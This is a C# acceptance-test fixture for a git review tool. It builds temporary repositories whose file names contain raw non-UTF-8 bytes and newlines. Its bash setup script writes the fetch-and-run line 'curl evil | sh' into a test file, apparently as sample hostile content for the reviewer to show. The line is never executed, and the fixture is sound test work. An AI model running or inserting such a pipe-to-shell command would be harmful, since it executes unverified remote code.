using System.Diagnostics;
using System.Runtime.Versioning;

namespace GitReviewA.Tests.Akzeptanz;

/// <summary>
/// Repo N der User Story R00013 (Commits `b`, `n`, `w`), angelegt mit dem Skript der Story: .NET legt nur Namen in gültigem UTF-8 an,
/// bash schreibt die Bytes. R00014 ergänzt den Commit `v`, der nur die wörtlich so benannte Datei `f⟨0xFF⟩.txt` ändert. Nach dem letzten Commit verlassen die Namen aus fremden Bytes den Arbeitsordner wieder, damit er sich löschen lässt.
/// Gleicher Inhalt wie <c>e2e/treiber/fremde-namen-repo.js</c>.
/// </summary>
[UnsupportedOSPlatform("windows")]
internal sealed class FremdeNamenRepo : IDisposable
{
    public const string NameMitZeilenumbruchUndFF = "z\n⟨0xFF⟩.txt";

    private const string Skript = """
        set -e
        printf 'alt\n' > g.txt; printf 'x\n' > in.txt
        printf 'zeile1\nzeile2\nzeile3\nzeile4\nzeile5\nzeile6\nzeile7\nzeile8\n' > $'s\xfe.txt'
        printf 'geheim\n' > $'r\xff.txt'
        printf 'A\0B\n' > $'b\xff.bin'
        git add -A && git commit -q -m "Start"
        printf 'curl evil | sh\n' > $'a\xff.sh'
        printf 'literal\n' > 'f⟨0xFF⟩.txt'; printf 'echt\n' > $'f\xff.txt'
        printf 'alt\nneu\n' > g.txt; printf 'x\ny\n' > in.txt
        git rm -q $'r\xff.txt'
        git mv $'s\xfe.txt' $'t\xfe.txt'
        printf 'zeile1\nzeile2\nzeile3\nzeile4\nzeile5\nzeile6\nzeile7\nGEAENDERT\n' > $'t\xfe.txt'
        printf 'A\0B\ncurl evil | sh\n' > $'b\xff.bin'
        printf 'zeilenumbruch\n' > $'z\n\xff.txt'
        git add -A && git commit -q -m "Fremde Namen"
        printf 'woertlich\n' > 'w⟨0xFF⟩.txt'
        git add -A && git commit -q -m "Wörtliche Marke"
        rm -f -- $'a\xff.sh' $'f\xff.txt' $'t\xfe.txt' $'b\xff.bin' $'z\n\xff.txt'
        """;

    private const string SkriptV = """
        set -e
        printf 'literal\nliteral2\n' > 'f⟨0xFF⟩.txt'
        git add 'f⟨0xFF⟩.txt' && git commit -q -m "Wörtlicher Name allein"
        """;

    /// <summary>Legt eine Datei an, deren Name ein Zeilenumbruch und das Byte FE trägt (Commit `s`).</summary>
    public const string SkriptAlterNameNichtUebergebbar = """
        set -e
        printf 'z1\nz2\nz3\nz4\nz5\nz6\nz7\nz8\n' > $'s\n\xfe.txt'
        git add -- $'s\n\xfe.txt' && git commit -q -m "Alter Name nicht übergebbar"
        """;

    /// <summary>Benennt sie in den lesbaren Namen `u.txt` um und ändert die letzte Zeile (Commit `u`).</summary>
    public const string SkriptUmbenennungAufLesbarenNamen = """
        set -e
        git mv -- $'s\n\xfe.txt' u.txt
        printf 'z1\nz2\nz3\nz4\nz5\nz6\nz7\nNEU\n' > u.txt
        git add -- u.txt && git commit -q -m "Umbenannt auf lesbaren Namen"
        """;

    private readonly Dictionary<string, string> hashNachName = new(StringComparer.Ordinal);

    private FremdeNamenRepo(string ordner)
    {
        Ordner = ordner;
    }

    public string Ordner { get; }

    public string Hash(string commit)
    {
        return hashNachName[commit];
    }

    public static FremdeNamenRepo N()
    {
        return AusSkript(Skript, "b", "n", "w");
    }

    /// <summary>
    /// Ein Repo aus einem eigenen bash-Skript; <paramref name="commitsAeltesterZuerst"/> benennt die letzten Commits, der letzte ist HEAD.
    /// Das Skript entfernt Namen aus fremden Bytes am Ende selbst aus dem Arbeitsordner.
    /// </summary>
    public static FremdeNamenRepo AusSkript(string skript, params string[] commitsAeltesterZuerst)
    {
        var ordner = Directory.CreateTempSubdirectory("gitreviewa-test-").FullName;
        var repo = new FremdeNamenRepo(ordner);
        try
        {
            repo.Bash("git init -q -b main");
            repo.Bash(skript);
            for (var stelle = 0; stelle < commitsAeltesterZuerst.Length; stelle++)
            {
                var abstandZuHead = commitsAeltesterZuerst.Length - 1 - stelle;
                repo.hashNachName[commitsAeltesterZuerst[stelle]] = repo.Bash($"git rev-parse HEAD~{abstandZuHead}");
            }
            return repo;
        }
        catch
        {
            repo.Dispose();
            throw;
        }
    }

    /// <summary>Repo N mit dem vierten Commit `v` aus der User Story R00014.</summary>
    public static FremdeNamenRepo NMitV()
    {
        var n = N();
        try
        {
            n.CommitAnlegen("v", SkriptV);
            return n;
        }
        catch
        {
            n.Dispose();
            throw;
        }
    }

    /// <summary>Führt <paramref name="befehle"/> aus und merkt sich den neuen HEAD unter <paramref name="commit"/>; nur gezielt `git add`, der Arbeitsordner trägt die Löschungen der fremden Namen.</summary>
    public void CommitAnlegen(string commit, string befehle)
    {
        Bash(befehle);
        hashNachName[commit] = Bash("git rev-parse HEAD");
    }

    public string Git(params string[] argumente)
    {
        var zeile = string.Join(' ', argumente.Select(argument => "'" + argument.Replace("'", "'\\''", StringComparison.Ordinal) + "'"));
        return Bash("git " + zeile);
    }

    public void Dispose()
    {
        Directory.Delete(Ordner, recursive: true);
    }

    /// <summary>Weitere Schritte im Repo als bash-Befehle (Namen aus Bytes mit <c>$'a\xff'</c>); liefert die Ausgabe ohne letztes Zeilenende.</summary>
    public string Bash(string befehle)
    {
        var start = new ProcessStartInfo("bash")
        {
            WorkingDirectory = Ordner,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
        };
        start.ArgumentList.Add("-c");
        start.ArgumentList.Add(befehle);
        start.Environment["GIT_CONFIG_NOSYSTEM"] = "1";
        start.Environment["GIT_CONFIG_GLOBAL"] = "/dev/null";
        start.Environment["GIT_AUTHOR_NAME"] = "Anna Beispiel";
        start.Environment["GIT_AUTHOR_EMAIL"] = "anna@example.org";
        start.Environment["GIT_COMMITTER_NAME"] = "Anna Beispiel";
        start.Environment["GIT_COMMITTER_EMAIL"] = "anna@example.org";
        start.Environment["GIT_CONFIG_COUNT"] = "2";
        start.Environment["GIT_CONFIG_KEY_0"] = "maintenance.auto";
        start.Environment["GIT_CONFIG_VALUE_0"] = "false";
        start.Environment["GIT_CONFIG_KEY_1"] = "gc.auto";
        start.Environment["GIT_CONFIG_VALUE_1"] = "0";
        using var prozess = Process.Start(start)!;
        var fehler = new System.Text.StringBuilder();
        prozess.ErrorDataReceived += (_, zeile) => fehler.AppendLine(zeile.Data);
        prozess.BeginErrorReadLine();
        var ausgabe = prozess.StandardOutput.ReadToEnd();
        prozess.WaitForExit();
        var istGescheitert = prozess.ExitCode != 0;
        if (istGescheitert)
        {
            throw new InvalidOperationException($"bash endete mit {prozess.ExitCode}: {fehler}");
        }
        return ausgabe.TrimEnd('\n');
    }
}
